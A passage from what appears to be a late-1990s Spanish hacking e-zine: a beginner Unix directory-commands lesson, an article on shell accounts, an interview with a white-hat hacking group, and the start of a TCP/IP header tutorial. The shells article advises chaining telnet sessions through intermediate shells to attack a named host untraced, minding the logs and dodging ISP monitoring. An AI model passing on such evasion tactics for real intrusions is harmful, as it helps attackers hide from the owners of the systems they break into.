sugerencias,erratas,etc,etc. las podeis enviar al correo del e-zine o bien a
ireick@hotmail.com

Venga pues hasta la proxima entrega.
        





ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
º         * ARTICULO *         º      * TEMA *      º       * NIVEL *       º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄº
º5.- Curso de UNIX IV          º      Hacking       º         Bajo          º
ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
                                                                     [ Ripe ]

En el numero anterior de este magnifico curso de UNIX (modestia aparte)
aprendimos las caracteristicas del sistemas de archivos en este sistema
operativo, y ahora aprenderemos a movernos entre los directorios y a realizar
algunas acciones con los archivos.

Si alguno de votros ha tenido la oportunidad de trabajar con un UNIX habreis
notado que, en principio, UNIX no muestra el directorio actual en el simbolo
del sistema o promt (aun que UNIX es muy configurable y es posible hacer que
SI aparezca), por ello es posible que en algun momento te encuentres perdido
y no sepas en que directorio estas, es entonces cuando debes usar la orden
"pwd", ella hara que el sistema te devuelva el directorio actual.

-----------------------------------------------------------------------------
|       $pwd                                                                |
|       /usr/ripe/xploits/winNT                                             |
|       $_                                                                  |
-----------------------------------------------------------------------------

Pero, como en la mayoria de los sistemas operativos, en UNIX no se trabaja
siempre en el mismo directorio (y de echo siempre es mejor tener tus archivos
ordenados por directorios, facilitando asi su busqueda en caso de necesidad),
por lo que disponesmos de la orden "cd" para cambiar el directorio actual. Al
conrario que "pwd" esta orden precisa de un parametro, y si este no se
introduce UNIX usara la variable $HOME (que contiene el directorio inicial o
de conexion) como parametro.

Como parametro de la orden "cd" debemos introducir el camino hacia otro
directorio, este camino puede ser relativo (iniciandose desde el directorio
actual) o absoluto (iniciandose desde la raiz "/").

-----------------------------------------------------------------------------
|       $pwd                                                                |
|       /usr/ripe                                                           |
|       $cd textos                                                          |
|       $pwd                                                                |
|       /usr/ripe/textos                                                    |
|       $cd /usr/ripe/xploits/winNT                                         |
|       $pwd                                                                |
|       /usr/ripe/xploits/winNT                                             |
|       $_                                                                  |
-----------------------------------------------------------------------------

Como se puede observar, en este cado el parametro de "cd textos" es un
camino relaivo, ya que depende del directorio actual, el camino absoluto
equivalente seria "<directorio actual>/textos". En el segundo caso "cd
/usr/ripe/xploits/winNT" usamos un camino relativo, que como se puede
observar empieza desde el directorio raiz "/".

UNIX incorpora ademas dos subdirectorios imaginarios dentro de cada uno de
los directorios, estos son "." (un punto), que hace referencia al directorio
actual, y ".." (dos puntos), que hace referencia al directorio padre del
directorio actual. Asi pues, por ejemplo, si nos encontramos en /usr/ripe y
queremos usar un camino relativo hasta /usr, solo tendremos que usar el
diectorio ".." de la siguiente manera.

-----------------------------------------------------------------------------
|       $pwd                                                                |
|       /usr/ripe                                                           |
|       $cd ..                                                              |
|       $pwd                                                                |
|       /usr                                                                |
|       $_                                                                  |
-----------------------------------------------------------------------------

NOTA: (Para los usuarios de MS-DOS), en UNIX a diferencia que en el sistema
      operatido de Microsoft debe haber un espacio entre la orden "cd" y los
      dos puntos.

Pero aqui no se acaban todas las posiblidades de la orden "cd"... ¨Que pasa
si tenemos la intencin de trabajar en dos directorios diferentes de manera
que tengamos que ir cambiando de uno al otro? La pregunta tiene dos
soluciones, la primera que voy a explicar permite unicamente ir jugando con
dos directorios, mientras que la otra, permite todos los que el usuario
necesite.

Vayamos al primer metodo. Si nosotros utilizamos el simbolo "-" como
parametro de la orden "cd", esto nos devolvera al directorio anterior, de
manera que nos sera poible ir moviendonos entre dos directorios diferentes
sin tener que escribir todo el rato el camino (relativo o absoluto). Vamos a
suponer que queremos trabajar en los directorios "/usr/ripe/xploits/sendmail"
y "/etc".

-----------------------------------------------------------------------------
|       $pwd                                                                |
|       /usr/ripe/xploits/sendmail                                          |
|       $cd /etc                                                            |
|       $pwd                                                                |
|       /etc                                                                |
|       $cd -                                                               |
|       $pwd                                                                |
|       /usr/ripe/xploits/sendmail                                          |
|       $cd -                                                               |
|       $pwd                                                                |
|       /etc                                                                |
|       $_                                                                  |
-----------------------------------------------------------------------------

NOTA: Podriamos pasarnos toda la vida pasando de /usr/ripe/xploits/sendmail a
      /etc usando "cd -", pero da un poco de palo hacerlo :) 

El segundo metodo es algo mas complejo, aunque tambien mas potente, este
consiste en crear variables que contenganlos directorio que vamos a usar, asi
pues nos podremos mover entre ellos poniendo "cd <variable>", sin tener que
escribir en todo momento el camino. Para asignar una varaible usaremos la
siguiente estructura "<nombre de la variable>=.<contenido asignado>".

NOTA: El tema de las variables lo trataremos mas a fondo en proximos numeros
      de este curso, tened paciencia....

-----------------------------------------------------------------------------
|       $VARAIBLE1=/etc                                                     |
|       $VARIABLE2=/usr/ripe/textos/virii                                   |
|       $VARIABLE3=/usr/ripe/xploits/girlhack                               |
|       $pwd                                                                |
|       /usr/ripe                                                           |
|       $cd $VARIABLE1                                                      |
|       $pwd                                                                |
|       /etc                                                                |
|       $cd $VARIABLE3                                                      |
|       $pwd                                                                |
|       /usr/ripe/xploits/girlhack                                          |
|       $cd $VARIABLE2                                                      |
|       $pwd                                                                |
|       /usr/ripe/textos/virii                                              |
|       $cd $VARIABLE1                                                      |
|       $pwd                                                                |
|       /etc                                                                |
|       $_                                                                  |
-----------------------------------------------------------------------------

Como podeis ver, al usar cada una de las variables, a¤adimos el signo "$"
delante de la misma, esta es la manera de que UNIX inteprete esa palabra como
una variable.

NOTA: En este ejemplo se usan unicamente 3 variables, pero podriamos usar las
      que nos direa la gana.

Espero que hayan quedado claras todas las posiblidades que la orden "cd" de
UNIX nos ofrece, pues esta es una de las ordenes que mas usaremos para
movernos.

Como he dicho en algun momento de este numero del curso de UNIX, es muy
recomendable tener los archivos bien organizados, pero ¨Como vamos ha hacer
eso si no sabemos como crear y eliminar directorios? Pues nada chicos, todo
tiene solucion, ahora os lo cuento.

UNIX usa las ordenes "mkdir" (make directory) y "rmdir" (remove directory)
para crear y eliminar directorios respectivamente.

Con la orden "mkdir" crearemos un directorio dentro del directorio actual.

-----------------------------------------------------------------------------
|       $pwd                                                                |
|       /usr/ripe/xploits                                                   |
|       $mkdir win2000                                                      |
|       $cd win2000                                                         |
|       $pwd                                                                |
|       /usr/ripe/xploits/win2000                                           |
|       $_                                                                  |
-----------------------------------------------------------------------------

Acabamos de ver como crear un directorio dentro del directorio actual, pero
no terminan ahi las podiblidades de "mkdir", tambien es posible crear caminos
relativos en el interior del directorio actual, cosa que nos puede ahorrar en
algunos casos mucho trabajo. Para realizar la creacion de caminos
utilizaremos el parametro "-p".

-----------------------------------------------------------------------------
|       $pwd                                                                |
|       /usr/ripe                                                           |
|       $mkdir -p 7A69/num8                                                 |
|       $cd 7A69/num8                                                       |
|       $pwd                                                                |
|       /usr/ripe/7A69/num8                                                 |
|       $_                                                                  |
-----------------------------------------------------------------------------

La otra orden, "rmdir", sirve para borrar directorios siempre que estos no
contengan nada en su interior (unicamente los directorio imaginarios de los
que ya hablamos, "." y "..").

-----------------------------------------------------------------------------
|           $pwd                                                            | 
|           /usr/ripe/textos/win                                            |
|           $cd ..                                                          |
|           $rmdir win                                                      |
|           $pwd                                                            |
|           /usr/ripe/textos                                                |
|           $cd win                                                         |
|           win: not a directory                                            |
|           $mkdir linux                                                    |
|           $cd ..                                                          |
|           $rmdir textos                                                   |
|           rmdir: textos: directory not empty                              |
|           $_                                                              |
-----------------------------------------------------------------------------

NOTA: Como se puede observar, con la orden "rmdir" no es posible eliminar
	  directorios que contienen algo en su interior.

¨Y como co¤o lo hago para borrar un directorio con archivos? ¨Tengo que 
borrar primero los archivos uno por uno y luego borrar el directorio? La 
respuesta es no, pues en UNIX existe otra orden destinada a borrar archivos,
que con el parametro indicado permite borrar directorios con todo el 
contenido de su interior, la orden en cuestion es "rm", y el parametro es
"-r". Asi pues, siguiendo el ejemplo anterior:

-----------------------------------------------------------------------------
|               $pwd                                                        |
|               /usr/ripe                                                   |
|               $rm -r textos                                               |
|               $cd textos                                                  |
|               textos: not a directory                                     |
|               $_                                                          |
-----------------------------------------------------------------------------

NOTA: Como veremos mas adelante, "rm" sirve tambien para eliminar archivos no
          directorio ;)

Aqui termina este 4 numero del curso de UNIX (poco a poco decian las almas
sin cesar), en el quinto numero... mas :)





ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
º         * ARTICULO *         º      * TEMA *      º       * NIVEL *       º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄº
º6.- Shells, ¨Que co¤o es eso? º      Hacking       º         Bajo          º  
ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
                                                                     [DAn_^^]

Bueno aqui teneis un manual sobre cuentas shells, en el cual os explicare:

1.0 =>¨Que es una shell?
1.1 =>¨Para que sirve una shell?
1.2 =>¨Tipos de shells? 
1.3 =>¨Como conseguir shells?
1.4 =>Comandos para una shell
1.5 =>¨Que hacer para no ser explulsado de tu shell? 
1.6 =>DeSPeDiDa


        1.0 shELL

Una cuenta shell te permite usar el ordenador de tu casa como un terminal a
traves del cual le puedes introducir comandos a un ordenador con Unix. El
"shell" es el programa que traduce lo que tecleas en comandos Unix.


        1.1 cOnDoN

Una shell tiene infinidad de utilidades la mas comun en nuestro caso es la de
protegerse y que no te pillen con las manos en la masa. Pongamos un ejemplo:

shell=condon.

ke te localicen=pillastes la enfermedad.

xDD expliquemos: imaginemos que quieres hackear el sistema tbep.eof.de si lo
haces directamente pues lo mas seguro es que te pillen, ya la cagues, para
que no suceda eso pues utilizaras un par de condones, de la siguiente manera:

-----------------------------------------------------------------------------
|                                                                           |
|       telnet shell1.condon.org                                            |
|       login:                                                              |
|       pass:                                                               |
|       You entered in my system "condon"                                   |
|                                                                           |
|       telnet shell2.condon.org                                            |
|                                                                           |
|       Please, type login and password...                                  |
|       Login:                                                              |
|       Password:                                                           |
|                                                                           |
|       Have a nice day...                                                  |
|                                                                           |
|       telnet tbep.eof.de                                                  |
|       login:                                                              |
|       pass:                                                               |
|                                                                           |
-----------------------------------------------------------------------------

Ya soy un jacka...

Lo que he hecho ha sido conectarme en un primer telnet, desde dentro de ese
sistema he hecho otro telnet, y luego desde dentro del segundo he vuelto
hacer llamada de telnet.

!oJo¡ procura tener cuidado con los log! ;P

        <Ripe: Recordad que ya publicamos que explicaba como
               no dejar huellas :P>


        1.2 TIPOS DE SHELLS

Aqui os voy a explicar los distintos tipos de shells, que nos podemos
encontrar: Hay diferentes tipos de shells segun cada una tiene unas
caracteristicas determinadas, para averiguar el tipo de shell que tienes..
teclea en el prompt "echo $SHELL" Si el comando "echo $SHELL" no funciona,
prueba  "echo $shell". despues de hacer esto te saldra el tipo de shell que
tienes:

1.- Si te sale:     /bin/csh     esto es  que tienes una C shell

2.- Si te sale:     /bin/bash    tienes una cuenta Bourne Again (bash) shell

3.- Si te sale:     /bin/sh      significa que tienes una cuenta Bourne shell

4.- Si te sale:     /bin/ksh     es que tienes una korn shell


Es un poco importante saber el tipo de shell que tienes porque sabras si
tienes una shell sencilla/dificil de utilizar.(^H^H^H)

Si quieres saber que otras cuentas shell tienes derecho a utilizar: "tcsh"
para la Tcsh shell "csh" para entrar en la C shell "ksh" para la Korn shell 
"zsh" para la Zsh shell "sh" para Bourne shell  si no tienes ninguna de ellas
cuando pongas el comando para entrar en tu shell te saldra "comando no
encontrado"


        1.3 ¨como conseguir shells?

Bueno, aqui tienes unas cuantas opciones:

1.- Tener un colega de puta madre que te de shells (si lo tienes
    presentamelo)

               <Ripe: Hehehe, a mi tambien>

2.- Pues ir a un chat (IRC) y vas a algun canal de hack... y alli le abres
    un privado a alguien y le pides educadamente que te diga algun servidor
    de cuentas gratuitas. freeshell.org

3.- Busca en e-zines de hack,links...

               <Ripe: Bueno, tambien cabe la posiblidad de
                      soltar una pasta y comprarte una, 
                      aunque no seria recomendabre hacker
                      desde ella>


        1.4 COMANDOS MAS CONOCIDOS PARA UTILIZAR EN TU SHELL

1.- man <comando>: Sirve para consultar el manual de forma interactiva.

2.- ls: Lista archivos equivale a dir. "ls -l" da informaciom sobre la
        caracteristicas de un

3.- pwd: Te muestra el directorio en el que te encuentras. 

4.- cd <directorio>: Cambia de directorio./bin /etc y  /tmp.

5.- more <nombre de archivo>: Muestra el contenido de archivos.

6.- whereis <nombre de programa>: Para buscar algo ke te somprende.

7.- vi: Un programa de edicion. Lo necesitas para crear tus propios archivos
        y cuando empieces a programar mientras estas en tu cuenta shell.
        Puedes usarlo para crear un archivo de "amable bienvenida" para que
        la gente que te haga finger lo lea.

8.- grep: Extrae informacion de archivos, especialmente util para ver que hay
          en los archivos syslog y shell log. 

9) chmod <nombre de archivo>: Modifica los permisos de un archivo.

10) rm <nombre de archivo>: Borra un archivo.    

11)cp <nombre de archivo> <nuevo nombre de archivo>: Para copiar un archivo.

12)mv <nombre de archivo> <nuevo nombre de archivo>: Para mover un archivo.

        <Ripe: Podreis consegur mas informacion sobre el
               funcionamiento de UNIX (en especial el bash :P)
               si seguis el curso de UNIX publicado en este
               mismo e-zine>
                   

        1.5 ¨Que hacer para no ser explulsado de tu shell?

Bueno una vez que tengas la shell el problema es que no tienes derecho para
mantener la shell puedes ser explulsado cuando menos te lo esperes ,si eres
sospechoso,si te portas mal...
  
1.- Utilizar programas sospechosos: Si utilizas algun programa de caracter
                                    sospechoso,para el uso de delitos
                                    informaticos pues vete haciendo las
                                    maletas muchos ISP`s tienen sistemas de
                                    monitorizacion que detectan el uso de
                                    algun programilla.

2.- Nunca te aprobeches de tu isp: La gloria te duraria segundos,cuando
                                   vuelvas a conectar veras ke ya no
                                   puedes...

3.- Abuso del Ping: Es una tentacion muy grande, poder joder al subnormal de
                    turno (l4m3r), no utilices el ping para eso y si no
                    atente a las consecuencias.

4.- Port surfing excesivo: Port surfing es hacer telnet a puertos especificos
                           de un ordenador,(Los registros de las visitas a
                           los puertos se almacenan en "messages", y a veces
                           en "syslog") No te digo mas andate con ojo...


1.6 DESpediDA

saludos a mis colegas de h3x : seth_EM, DIV, _Socrates, BaRnEr. Y a todos los
demas de #hacker,#hackers,#hacking,#seguridad_de_la_red,#e-n-g,
#networking etc...

BUeno aki termino.

            <Ripe: pues yo saludo a mi madre de nuevo>





ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
º         * ARTICULO *         º      * TEMA *      º       * NIVEL *       º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄº
º7.- Charlando con             º     Entrevista     º                       º
º    - J.J.F. / Hackers Team - º                    º                       º
ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
                                                                     [ Ripe ]

Bueno, volvemos a estar aqui una vez mas, esta vez nos acompa¤a el
prestigioso grupo de hack (blanco) - J.J.F. / Hackers Team -. He de agradecer
a Conde Vampiro las facilidades que ha dado para realizar la entrevista
(tambien a GriYo, que me olvido en el pasado numero :P).

¨Quien no conoce a - J.J.F. / Hackers Team -? Yo creo que culquiera que este
"algo" metido en el mundillo sabe, que este grupo de Hack, se dedica
actualmente a la practica del "white hack", y que algunas de las
vulnerabilidades que han encontrado se han dado a conocer en todo el mundo.
- J.J.F. / Hackers Team - es sin duda uno de los grupos que mas ha dado a la
scene espa¤ola (scene a la que sin duda le queda aun mucho trabajo).


                        ²²²           ²²²      ²²²²²²²²
                        ²²²           ²²²      ²²²²²²²²
                        ²²²           ²²²      ²²²
                        ²²²           ²²²      ²²²²²²
                        ²²²           ²²²      ²²²²²²
                  ²²²   ²²²     ²²²   ²²²      ²²²
                  \²²²²²²²/     \²²²²²²²/      ²²²
                   \²²²²²/  [²]  \²²²²²/   [²] ²²²    [²]


Bueno, quiza que vayamos con la entrevista (iep, iep):


1.- ¨Cuando y como nacio - J.J.F. / Hackers Team -?

     - J.J.F. / Hackers Team - nacio a mediados 1996 de la
     mano de Conde Vampiro. La idea era de hacer un grupillo
     entre unos amigos para ir haciendo cosillas juntos. Tanto
     individualment como colectivamente.


2.- ¨Que significan las siglas J.J.F.?

     La eterna pregunta y siempre la misma contestacion: es
     un secretito.... Quien sabe si algun dia lo diremos }:-)


3.- ¨En que consiste el hack blanco?

     El "white hat hacking" define a aquellos hackers que usan
     su talento a favor de la seguridad, generalmente a I+D o
     servicios de seguridad. En muchos casos, ambos. Desarrollo
     de herramientas, documentos, busqueda de xploits, etc..
     Cosas divertidas ;-)


4.- ¨Cuando y porque decidis empezar a practicar el hack blanco?

     Nuestra cambio fue sobre mediados de 1998, pensamos que
     estabamos perdiendo el tiempo y queriamos hacer algo que
     nos pudiera ser beneficioso y que nos pudiera ser util en
     nuestro futuro. Creemos que ha sido todo un acierto. 


5.- ¨Podeis contar alguna aza¤a vuestra (antes o despues de de decidiros por
    el hack blanco)?

     Lo de antes, queda en el pasado :) Y para ver nuestras
     actuales haza¤as basta con visitar el web y ver nuestro
     trabajo que tampoco es nada del otro mundo pero en fin
     ahi esta para el que quiera seguirnos en nuestras
     locuras ;-)

                   http://www.jjf.org


6.- ¨Son mejores los administradores de sistemas que empiezan sus contactos
    con el computador en el lado oscuro?

     No. Existen administradores que nunca han hecho hacking
     y son muy buenos administrado. No por ser hacker eres
     mejor administrador. Al igual que no por ser hacker, eres
     un buen hacker :) Para ser hacker ahi que ganarselo, no
     por romper la seguridad en sistemas ajenos eres
     un hacker, eso realmente lo puede hacer cualquiera
     con tiempo.


7.- ¨Que recomendaciones podeis dar a todas esa  persona que deciden
    iniciarse en el mundo de hack?

     Pues mas espabilarse, enviar menos mails de "quiero ser...",
     y mas dedicarse a ver como realmente funciona los s.o.,
     programacion, etc... Asi es como se aprende. Investiga
     todos los rincones de tu s.o., programate herramientas y
     xploits, etc.. 


8.- ¨Como veis la evolucion que el Under Hispano esta  teniendo en los
    ultimos a¤os?¨Puede compararse con lo que se puede encontrar en USA?

     En el ultimo a¤o han aparecido tantos grupos y tanta
     gente, que uno ya no sabe. Cada dia me dicen: "oye, conoces
     a tal grupo.." y ni idea. Aunque realmente no ha cambiado
     nada, poca gente esta produciendo algo, por desgracia. 
     Esperemos que esto cambie pronto, queremos ver cosas
     producidas por espa¤oles! ;-)


9.- Hablando de USA: ¨Que tal os va por alli?¨Cuando teneis pensado volver a
    Espa¤a?

     Por aqui, va genial :) Y lo de volver a espa¤a, personalmente
     por el momento no me interesa. Quiero estar aqui unos
     cuantos a¤os mas. Seguir estudiando, trabajar y bueno
     ya sabeis... ;-)


10.- ¨Se tiene pensada la organizacion de una segundo edicion de la
     No Con Name?

     Supongo que si, pero por el momento no sabemos cuando
     ni donde. Pero si que se hara una segunda edicion
     cuando nos sea posible, que tenemos ganas :)


11.- ¨Para cuando el proximo numero de vuestro E-zine?

     Por el momento el zine, esta parado. Falta de tiempo
     y prefiero dedicarme a otras cosas que creo mas
     importantes.


12.- ¨Es posible que lo retomeis en un futuro
     
     Si, quien sabe, a lo mejor un dia damos una sorpresa
     a nuestros queridos lectores ;-)


13.- ¨Que proyectos personales teneis cada uno?

     Yo estoy liado en varias cosas, que iran dando
     sus frutos a lo largo de este a¤o. Que estoy
     seguro que seran del agrado de la gente :) Ahora
     todos mis esfuerzos se concentran en dos cosas:
     Roses Labs y w00w00 Security Development (WSD)

              http://www.w00w00.org


14.- ¨Que es Roses Labs? ¨Cuales son sus objetivos?

     Roses Labs es una empresa privada dedicada a la
     investigacion sobre segurida informatica, la
     cual mas adelante ofrecera servicios. Practicamente
     todo el trabajo de Roses Labs esta disponible en el
     propio website, ademas que es totalmente free y
     open source :)

     Para mas informacion sobre Roses Labs (RL) recomiendo
     leer la seccion "ABOUT".

            http://www.roses-labs.com


15.- ¨Quien mas participa en este proyecto?

     Como ya dije antes, Roses Labs no es un proyecto. Y por
     lo tanto sus componentes prefieren mantener su anonimato.
     No vemos la necesidad de decir quien forma la
     empresa.
 

16.- ¨Ofrece o ofrecera Roses Labs servicios comerciales?

     Si, con el tiempo se ofreceran distintos servicios de
     seguridad. Ya tenemos dise¤ados modelos de seguridad
     para peque¤as y medianas empresas, que se ajustan a sus
     necesidades. Por supuesto no nos olvidamos de las
     grandes empresas :) Aunque por el momento, estos
     servicios no estan disponibles y supongo que hasta
     mediados de a¤o, no lo estaran. Todo a su debido
     tiempo.



Aqui termina la entrevista de hoy, jeje, para el proximo numero tendremos con
nosotros al Profesor Falken, colaborador de Saqueadores Edicion Tecnica, que
nos sorprende con sus articulillos sobre telefonia. Si teneis alguna pregunta
para el "profe"..... ya sabeis; 7a69ezine@mixmail.com





ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
º         * ARTICULO *         º      * TEMA *      º       * NIVEL *       º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄº
º8.- Entra¤as de Internet;     º      Hacking       º         Alto          º
º    Protocolos y demas        º                    º                       º
ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
                                                                     [ Ripe ]

NOTA: Este texto es de un nivel tecnico mas o menos alto, sin embargo no
      precisa de demasiados conocimientos previos (aun que si algunos) ya que
      intentaremos tratar el tema de manera visual y practicamente desde
      cero. Aun asi cabe la posiblidad de que no entendais el texto (o alguna
      parte de el), en ese caso te recomiendo que no te desanimes y sigas
      lellendo, de este modo seguro que captaras algun concepto que te podra
      ayudar a aprender mas deprisa el funcionamiento de los protocolos de
      Internet.

Internet es sin duda el metodo de comunicacion mas avanzado que el hombre ha
inventado, y la verdad es que cuando se invento no se creian que fuera a
tener tanta importancia en el ocio y en el comercio (De echo la invencion de
los protocolos que rigen internet, de los que hablaremos en este articulo,
fueron creados con un fin puramente militar, pero gracias a la transmision de
hipertexto se pudo crear la conocida Worl Wide Web llevando internet al
comercio y al ocio.

Para emprezar vamos a hacer una breve introduccion a los protocolos basicos
que vamos a tratar:

        IP (Internet Protocol)
        TCP (Transmision Control Protocol)
        UDP (User Datagrama Protocol)
        ICMP (Internet Control Mesajes Protocol)
        IGMP (Internet Group Multicast Protocol)

El protocolo que mas usa internet es TCP/IP que de echo es la union de TCP y
IP. ¨Y por que se unen dos protocolos? Los que leisteis el texto que |CoDeX|
publico en este mismo E-Zine ya deberiais saber la respuesta, pero en todo
caso la volvere a dar. IP es el protocolo que se encarga de encaminar los
paquetes atraves de la red (ya veremos como), pero no garantiza en ningun
caso que el paquete llege a su destino, por lo que necesita la ayuda de un
protocolo que realice una funcion de control, TCP (En algunos casos tambien
se usa UDP, concretamente cunado se precisa de una comunicacion NO orientada
a conexion).

Supongo que todos sabreis que TCP/IP funciona mediante capas (como todos los
modelos OSI), por lo que no dare una esplicaacion detallada de la
arquitectura de capas TCP/IP. Unicamente un esquema con las cabeceras que se
crean en cada momento:

**************************[ Empaquetado de Datos ]***************************


                               -Aplicacion-

                                ÚÄÄÄÄÄÄÄÄÄ¿
                                ³         ³
                                ³  Datos  ³
                                ³         ³
                                ÀÄÄÄÄÄÄÄÄÄÙ


                               -Trasnporte-

                          ÚÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄ¿
                          ³  Cabecera ³         ³
                          ³           ³  Datos  ³
                          ³ TCP o UDP ³         ³
                          ÀÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÙ
                          ÄÄ[ Segmento  TCP ]ÄÄ
                          ÄÄÄ[ Mensaje UDP ]ÄÄÄ 


                                  -Red-

                    ÚÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄ¿
                    ³ Cabecera ³  Cabecera ³         ³
                    ³          ³           ³  Datos  ³
                    ³  de IP   ³ TCP o UDP ³         ³
                    ÀÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÙ
                    ÄÄÄÄÄÄÄ[ Datagrama de IP ]ÄÄÄÄÄÄ


                            -Enlazando datos-

         ÚÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄ¿
         ³ Cabecera ³ Cabecera ³  Cabecera ³         ³ Cola de ³
         ³          ³          ³           ³  Datos  ³         ³
         ³ de tarma ³  de IP   ³ TCP o UDP ³         ³  trama  ³
         ÀÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÙ
         ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[ La trama ]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

*****************************************************************************

NOTA: Como se puede ver en la capa de transporte se a¤ade una cabecera, que
      sera TCP si la comunicacion esta orientada a conexion, y sera UDP si la
      comunicacion no esta orientada a conexion.

Como se puede ver al conjunto de "Datos + Cabecera TCP o UDP + Cabecera IP +
Cabecera y cola de trama" se le denomina "La trama", a la suma de "Datos +
cabecera TCP o UDP + Cabecera IP" se la conoce como "Datagrama de IP", al
conjunto de "Datos + Cabecera TCP" se le denomina "Segmento TCP" mientras que
a "Datos + Cabecera UDP" recibe el nombre de "Mensaje UDP".

¨Para que tantas cabeceras, que se almacena en ellas? Esto sera precisamente
lo que vamos a tratar un poco a fondo en este articulo, pero antes una breve
introduccion:

En la cabecera y cola de trama se almacena informacion suficiente para que La
trama pueda moverse por el medio fisico por el que debe hacerlo. Mediante la
cabecera IP, el mensaje sabe a que host debe ir (y mediante los protocolos de
encaminamiento de IP sabe como llegar a el). En TCP se encuentra la
informacion que permite asegurar que el paquete llega a su destino, UDP
realiza una cosa similar (como ya sabeis TCP esta orientado a conexion,
mientras que UDP no).

La implantacion de estas capas se realiza de la siguiente manera:

1.- La aplicacion selecciona los datos que deben ser enviados y se los deja a
    TCP (o a UDP) para que haga su trabajo.

2.- TCP (o UDP) colaco dichos datosen un buffer, cuando este se llena coloca
    su cabecera y entrega el segmento (o mensaje) a IP.

3.- IP coloca su cabecera, que permitira a los routers (mediante los
    protocolos de encaminamiento de IP) saber hacia donde deben ir los
    datos. Segudamente IP entrega sus datos a la red.

4.- Se colocan la cabecera y cola de la trama y se envian los datos al host
    de destino.

5.- Finalmente si todo va bien el host de destino recibe La trama.


Ya hemos visto una vision general de como funcionan los protocolos basicos en
en los que se rige internet, IP, TCP, UDP. Ahora vamos a tratar un poco mas a
fondo cada una de las cabeceras del datagrama.

NOTA: Nos olvidamos de la cabecera y la cola de la trama, pues no es el
      objetivo de este articulo tratar los medios fisicos con los que
      funciona Internet. Tratar la trama alargaria mucho este texto.

En el datagrama de IP encontramos la cabecera de IP y la cabecera TCP o UDP
(mas tarde verenis que tambien pueden ir las cabeceras ICMP o IGMP) seguidas
de los datos.

Empezaremos tratando la cabecera de IP.

***************[ Resaltando la cabecera IP en el datagrama ]*****************

